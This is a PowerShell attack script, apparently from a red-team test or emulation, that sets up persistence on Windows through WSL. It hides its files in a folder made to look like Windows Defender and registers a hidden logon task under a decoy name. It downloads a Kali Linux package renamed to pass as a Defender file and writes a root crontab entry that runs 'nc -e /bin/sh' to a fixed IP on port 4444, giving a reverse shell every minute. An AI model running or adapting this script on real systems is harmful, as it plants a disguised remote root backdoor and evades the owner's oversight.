mkdir "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\"
cd "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\"
Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName Microsoft-Windows-SubsystemLinux;
Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName VirtualMachinePlatform;
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle
Hidden -ExecutionPolicy Bypass -File
"C:\Users\CM_test\AppData\Local\Microsoft\WinDef\final_install.ps1"';
$trigger = New-ScheduledTaskTrigger -AtLogOn;
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily
dump of Applog";
$persistence = "cd `"C:\Users\CM_test\AppData\Local\Microsoft\WinDef\`";`nwsl --set-defaultversion 2;`n Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux -OutFile WinDefv19.20934.00029.appx -UseBasicParsing;`nAdd-AppxPackage .\WinDefv19.20934.00029.appx;`npowershell.exe -ExecutionPolicy bypass -f
C:\Users\CM_test\AppData\Local\Microsoft\WinDef\installer.ps1;"
$persistence | Out-File 'C:\Users\CM_test\AppData\Local\Microsoft\WinDef\final_install.ps1'
$installation = "`$timeout = 180`n`$code = { powershell.exe -ExecutionPolicy Bypass -File
C:\Users\CM_test\Desktop\init.ps1 }`n`$job = Start-Job -ScriptBlock `$code`nif (Wait-Job `$job -
Timeout `$timeout) { Receive-Job `$job }`nStop-Job `$job`nRemove-Job `$job`nbash -c `"echo `'Hello
World!`' > /home/test.txt && apt-get update && apt-get -y install netcat && echo `'* * * * * root nc -
e /bin/sh 192.168.149.215 4444`' >> /etc/crontab && service cron restart`";"
$installation | Out-File "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\installer.ps1"
$initialize = "kali;"
$initialize | Out-File "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\init.ps1"
Restart-Computer -force;
